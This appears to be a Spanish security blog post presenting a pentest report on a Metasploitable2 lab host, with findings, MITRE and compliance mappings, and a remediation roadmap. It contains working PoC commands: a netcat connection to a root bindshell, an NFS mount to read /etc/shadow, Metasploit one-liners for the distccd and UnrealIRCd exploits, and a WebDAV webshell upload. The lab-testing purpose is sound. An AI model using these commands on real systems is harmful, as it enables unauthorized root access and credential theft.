---
title: 'Informe de Pentesting  laboratorio'
date: '2025-08-27'
lastmod: '2025-08-28'
tags: ['pentesting', 'owasp-top10', 'metasploitable2', 'rce', 'nfs', 'smb']
draft: false
summary: 'Pentest de laboratorio en 192.168.0.52 (Metasploitable2): RCE (distccd/UnrealIRCd), WebDAV con ejecución, NFS/SMB inseguros, métricas y roadmap.'
authors: ['default']
images: ['/static/images/informe-de-pentesting-laboratorio/cover.png']
---

---

> **Contexto**: ejercicio de pentesting controlado sobre **Metasploitable2** (192.168.0.52). Resultados con fines educativos y de **hardening**.
> **Interno**: consulta más casos en [#pentesting](/tags/pentesting) y [#owasp-top10](/tags/owasp-top10).

## PoCs destacados (extracto ejecutable)

```bash
# Bindshell root
nc 192.168.0.52 1524

# Telnet (credenciales descubiertas)
telnet 192.168.0.52 23

# NFS mount
showmount -e 192.168.0.52
sudo mount -t nfs 192.168.0.52:/ /mnt/nfs -o nolock
ls -la /mnt/nfs/etc

# distccd RCE (Metasploit)
msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 192.168.0.52; run'

# WebDAV PUT (cadaver)
cadaver http://192.168.0.52/dav
put shell.php
```

**Referencias**

- OWASP Top 10 2021: [A05 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/), [A06 Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/).
- NVD: [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687), [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075), [CVE-2012-2122](https://nvd.nist.gov/vuln/detail/CVE-2012-2122).

---

## Informe original (sin editar)

Para preservar la trazabilidad, se incluye el texto íntegro del reporte dentro de un bloque preformateado.

```text
Informe de Pentesting – laboratorio Versión: 1.1 Fecha: 2025-08-27 Cliente: laboratorio Alcance resumido Hosts: 192.168.0.52 Servicios: TCP/UDP estándar en host objetivo Ambiente: Controlado / autorizado Executive Dashboard Severidad Nº Hallazgos Crítico 4 Alto 5 Medio 1 Bajo 0 Tiempo hasta compromiso inicial: 1h 1m 40s Nº credenciales obtenidas: 6 Nº evidencias recolectadas: 29 Nº puertos expuestos: 12 Riesgo global: Alto Resumen Ejecutivo El objetivo 192.168.0.52 (Metasploitable2) expone múltiples se…ciones web vulnerables (DVWA, Mutillidae, phpMyAdmin, Tomcat). Se lograron múltiples compromisos exitosos contra el host 192.…ión remota de comandos vía distccd vulnerable (CVE-2004-2687). En un entorno real, esto habilitaría ataques de ransomware, exfiltración de bases de datos y pivoting lateral. Resumen Técnico Servicios destacados: 445/tcp, 2049/tcp, 80/tcp, 21/tcp, 6667/tcp, 3632/tcp, 23/tcp, 512/tcp, 513/tcp, 514/tcp, 3306/tcp, 5432/tcp Hallazgos clave: 10 Explotos validados: 3 Sesiones establecidas: 3 Credenciales recuperadas: 6 Metodología Se siguió PTES, con referencia a OWASP/NIST. Clasificación de Riesgos por Hallazgo Hallazgo Severidad Justificación Bindshell root (1524/tcp) expuesto Crítico Servicio bindshell en 1524/tcp otorga shell con privilegios root sin autenticación. Telnet sin cifrado con credenciales válidas Alto Servicio Telnet permite acceso con usuario válido (user:***). distccd vulnerable a RCE (CVE-2004-2687) Crítico El demonio distccd 3632/tcp ejecuta comandos arbitrarios en el host. NFS exporta / sin restricciones Alto Export de NFS permite montar la raíz del sistema y leer /etc/shadow. SMB (Samba 3.0.20) con shares anónimos RW Alto Samba permite acceso anónimo a recursos compartidos con permisos de lectura/escritura. HTTP/WebDAV permite PUT y ejecución de PHP Crítico Apache 2.2.8 con DAV/2 permite subir y ejecutar scripts en /dav. UnrealIRCd 3.2.8.1 con backdoor (CVE-2010-2075) Crítico Versión vulnerable con backdoor remoto preautenticado. Servicios r- (rlogin/rexec) inseguros expuestos Alto Servicios legacy aceptan autenticación débil y pueden permitir ejecución remota. MySQL 5.0.51a vulnerable (CVE-2012-2122) Alto Bug de autenticación permite bypass 1/256 peticiones. PostgreSQL 8.3.x con posibles credenciales por defecto Medio Servicio expuesto sin hardening; susceptibles credenciales por defecto. Hallazgos y PoC Bindshell root (1524/tcp) expuesto Descripción: Servicio bindshell en 1524/tcp otorga shell con privilegios root sin autenticación. Impacto: Compromiso total del host con privilegios de administrador. PoC: nc 192.168.0.52 1524 Evidencia asociada: artefacto sha256 ..(no hash en fingerprint) Telnet sin cifrado con credenciales válidas Descripción: Servicio Telnet permite acceso con usuario válido (user:***). Impacto: Acceso interactivo remoto; exposición de credenciales en texto claro. PoC: telnet 192.168.0.52 23 Evidencia asociada: artefacto sha256 ..(del fingerprint 23/tcp) distccd vulnerable a RCE (CVE-2004-2687) Descripción: El demonio distccd 3632/tcp ejecuta comandos arbitrarios en el host. Impacto: Ejecución remota de comandos (RCE) con privilegios del servicio. PoC: msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 192.168.0.52; run' Evidencia asociada: artefacto sha256 ..(fingerprint 3632/tcp) NFS exporta / sin restricciones Descripción: Export de NFS permite montar la raíz del sistema y leer /etc/shadow. Impacto: Exfiltración de credenciales y archivos sensibles; posibilidad de inyección de llaves. PoC: showmount -e 192.168.0.52 sudo mount -t nfs 192.168.0.52:/ /mnt/nfs -o nolock ls /mnt/nfs/etc Evidencia asociada: artefacto sha256 ..(fingerprint 2049/tcp) SMB (Samba 3.0.20) con shares anónimos RW Descripción: Samba permite acceso anónimo a recursos compartidos con permisos de lectura/escritura. Impacto: Escritura/ejecución arbitraria en rutas compartidas; posible escalamiento. PoC: smbclient -N -L //192.168.0.52 smbclient -N //192.168.0.52/tmp -c 'ls' Evidencia asociada: artefacto sha256 ..e97faff1 HTTP/WebDAV permite PUT y ejecución de PHP Descripción: Apache 2.2.8 con DAV/2 permite subir y ejecutar scripts en /dav. Impacto: Ejecución remota de código vía carga de webshell. PoC: cadaver http://192.168.0.52/dav # autenticación no requerida en laboratorio put shell.php Evidencia asociada: artefacto sha256 ..(fingerprint 80/tcp) UnrealIRCd 3.2.8.1 con backdoor (CVE-2010-2075) Descripción: Versión vulnerable con backdoor remoto preautenticado. Impacto: RCE preautenticado. PoC: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.0.52; run' Evidencia asociada: artefacto sha256 ..(fingerprint 6667/tcp) Servicios r- (rlogin/rexec) inseguros expuestos Descripción: Servicios legacy aceptan autenticación débil y pueden permitir ejecución remota. Impacto: Compromiso de cuentas a través de autenticación débil o confianza host. PoC: rlogin 192.168.0.52 -l user # según configuración MySQL 5.0.51a vulnerable (CVE-2012-2122) Descripción: Bug de autenticación permite bypass 1/256 peticiones. Impacto: Acceso a base de datos; posible lectura/escritura de datos sensibles. PoC: mysql -h 192.168.0.52 -u root # repetir intentos Evidencia asociada: artefacto sha256 ..acaef38a PostgreSQL 8.3.x con posibles credenciales por defecto Descripción: Servicio expuesto sin hardening; susceptibles credenciales por defecto. Impacto: Acceso a BD y datos sensibles. PoC: psql -h 192.168.0.52 -U postgres -p 5432 Evidencia asociada: artefacto sha256 ..1be330b9 Timeline del ataque 2025-08-27T12:07:42: Inicio recon 2025-08-27T13:09:22: Sesión bindshell-root en 192.168.0.52:1524 (root) 2025-08-27T13:11:24: Sesión telnet-user en 192.168.0.52:23 (user) 2025-08-27T13:12:56: Intento exploit CVE-2004-2687 en 192.168.0.52:3632 -> success 2025-08-27T13:13:00: Sesión distccd-rce en 192.168.0.52:3632 (unknown) Kill Chain / MITRE ATT&CK mapping Fase Técnica ID Reconocimiento Network Service Scanning T1046 Acceso inicial Exploitation of Remote Services T1210 Acceso inicial Valid Accounts (Telnet) T1078 Ejecución Command and Scripting Interpreter T1059 Movimiento lateral Remote Services T1021 Exfiltración Exfiltration Over Unencrypted/Unencrypted Protocol T1041 Impacto Data Encrypted for Impact (potencial) T1486 Compliance mapping Marco Control/Sección Relación OWASP Top 10 2021 A05: Security Misconfiguration Servicios inseguros (Telnet, NFS, SMB) OWASP Top 10 2021 A06: Vulnerable and Outdated Components distccd, UnrealIRCd, Apache 2.2.8 OWASP Top 10 2021 A01: Broken Access Control Shares anónimos, NFS / ISO/IEC 27001:2022 A.8, A.9, A.12, A.13 Gestión de activos, control de acceso, hardening, protección de comunicaciones PCI DSS v4.0 1, 2.2, 6.2, 8 Segmentación, configuraciones seguras, parches, gestión de credenciales Matriz de riesgo (probabilidad vs impacto) Críticos: Probabilidad Alta / Impacto Muy Alto Altos: Probabilidad Alta / Impacto Alto Medios: Probabilidad Media / Impacto Medio Métricas clave Time to Compromise (primera sesión): 1h 1m 40s Nº credenciales: 6 Nº evidencias: 29 Nº servicios expuestos: 12 Mapa de afectación Bindshell root (1524/tcp) expuesto → 192.168.0.52 → Impacto: Compromiso total del host con privilegios de administrador. Telnet sin cifrado con credenciales válidas → 192.168.0.52 → Impacto: Acceso interactivo remoto; exposición de credenciales en texto claro. distccd vulnerable a RCE (CVE-2004-2687) → 192.168.0.52 → Impacto: Ejecución remota de comandos (RCE) con privilegios del servicio. NFS exporta / sin restricciones → 192.168.0.52 → Impacto: Exfiltración de credenciales y archivos sensibles; posibilidad de inyección de llaves. SMB (Samba 3.0.20) con shares anónimos RW → 192.168.0.52 → Impacto: Escritura/ejecución arbitraria en rutas compartidas; posible escalamiento. HTTP/WebDAV permite PUT y ejecución de PHP → 192.168.0.52 → Impacto: Ejecución remota de código vía carga de webshell. UnrealIRCd 3.2.8.1 con backdoor (CVE-2010-2075) → 192.168.0.52 → Impacto: RCE preautenticado. Servicios r- (rlogin/rexec) inseguros expuestos → 192.168.0.52 → Impacto: Compromiso de cuentas a través de autenticación débil o confianza host. MySQL 5.0.51a vulnerable (CVE-2012-2122) → 192.168.0.52 → Impacto: Acceso a base de datos; posible lectura/escritura de datos sensibles. PostgreSQL 8.3.x con posibles credenciales por defecto → 192.168.0.52 → Impacto: Acceso a BD y datos sensibles. Tabla de evidencias Archivo Descripción SHA (últ. 8) network_discovery_recon-20250827T120459-13275.nmap Discovery de red local ..b91b0602 quick_tcp_recon-20250827T120459-13275.nmap Quick TCP top-1000 192.168.0.52 ..aa276ecf tcp_services_recon-20250827T120459-13275.nmap Detección de servicios/OS - 192.168.0.52 ..06ac3ec4 network_map.json scan ..6f25540f … (total 29 evidencias, ver índice completo en artefactos) Tabla de credenciales recuperadas (ofuscadas) Servicio Host Usuario Password telnet 192.168.0.52 user *** bindshell 192.168.0.52 root (none) local 192.168.0.52 msfadmin *** local 192.168.0.52 klog *** local 192.168.0.52 service *** (otros) 192.168.0.52 (varios) *** Recomendaciones priorizadas (roadmap) Inmediato (0-30 días) Deshabilitar Telnet y r-services; migrar a SSH. Cerrar puerto 1524 y eliminar backdoors. Parchar/aislar distccd y UnrealIRCd. Revocar/rotar todas las credenciales expuestas. Restringir NFS a export controlado; eliminar export de /. Auditar y restringir shares SMB anónimos. Mediano (30-90 días) Actualizar Apache/Tomcat y deshabilitar WebDAV si no es requerido. Implementar gestión de vulnerabilidades y escaneo continuo. Segmentar DB (3306/5432) a redes internas. Implementar MFA y políticas de contraseñas robustas. Largo (>90 días) Hardening base (CIS). Centralizar registros y detección (SIEM). Ejercicios de Red Team/Purple Team periódicos. Impacto (CIA triad + riesgo global) Confidencialidad: Comprometida (lectura de /etc/shadow, credenciales). Integridad: Riesgo alto (RCE, shares RW). Disponibilidad: Riesgo medio (posibles DoS colaterales). Riesgo global: Alto Limitaciones y alcance recon: Reconocimiento de red completo permitido, pero el único objetivo de explotación es 192.168.0.52 scan: NSE ausentes: rsh-* y pgsql-info; se usó fingerpr…V y scripts alternativos (rlogin-brute, rexec-brute, telnet-*). scan: DB Postgres: solo pgsql-brute disponible; sin pgsql-info. scan: La consola de escaneo se interrumpió; se reanudó con scripts alternativos. scan: Fallo en generación de nse_manifest: heredoc Python/argv; se reemplazó por variante bash con find+sha256sum. scan: Fallo en generación de nse_manifest: heredoc Python/argv; se reemplazó por variante bash con find+sha256sum. scan: Consola se cerró durante generación de manifest/updates; se reemplazó por finalize_scan.sh sin set -e. Próximos pasos (incluyendo retesting) Aplicar mitigaciones y solicitar retesting en 2 semanas. Validar cierre de puertos y cambios de configuración. Revisar logs de accesos no autorizados durante la ventana del pentest. Glosario de términos técnicos RCE: Remote Code Execution. NFS/SMB: Protocolos de compartición de archivos. WebDAV: Extensión de HTTP para edición remota. Bindshell: Servicio que expone un shell en un puerto TCP. Conclusión final La combinación de RCEs, backdoors y servicios inseguros permite el compromiso total del host 192.168.0.52. La exposición de un bindshell root y la posibilidad de subir webshells vía WebDAV requieren remediación inmediata y cierre de superficies de ataque. Anexo: Script PoC consolidado (laboratorio) # Bindshell root nc 192.168.0.52 1524 # Telnet (credenciales descubiertas) telnet 192.168.0.52 23 # user: (REDACTED) # NFS mount showmount -e 192.168.0.52 sudo mount -t nfs 192.168.0.52:/ /mnt/nfs -o nolock ls -la /mnt/nfs/etc # distccd RCE (Metasploit) msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS 192.168.0.52; run' # WebDAV PUT (cadaver) cadaver http://192.168.0.52/dav put shell.php
```

---

## Notas del editor (highlights)

- **Riesgo global:** Alto. **Time-to-compromise:** 1h 1m 40s.
- Superficies críticas: **distccd RCE**, **UnrealIRCd backdoor**, **WebDAV PUT + ejecución**, **NFS/SMB inseguros**, **bindshell root**.
- **Acciones inmediatas:** deshabilitar Telnet/r-services, cerrar 1524/tcp, parchar/aislar distccd y UnrealIRCd, restringir NFS y shares SMB, rotar credenciales.

## FAQ corta

- **¿Por qué es crítico WebDAV con ejecución?** Permite carga de **webshell** y RCE sin controles adicionales.
- **¿Por qué mantener DB internas?** Exponer 3306/5432 facilita ataques de fuerza bruta y exfiltración.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Informe de Pentesting – laboratorio",
  "datePublished": "2025-08-27",
  "dateModified": "2025-08-28",
  "author": [{"@type":"Person","name":"Cobalto Sec"}],
  "image": "/static/images/informe-de-pentesting-laboratorio/cover.png",
  "mainEntityOfPage": "https://cobalto-sec.tech/blog/informe-de-pentesting-laboratorio",
  "description": "Pentest en Metasploitable2 con RCE (distccd, UnrealIRCd), WebDAV con ejecución, NFS/SMB inseguros y hallazgos críticos."
}
</script>
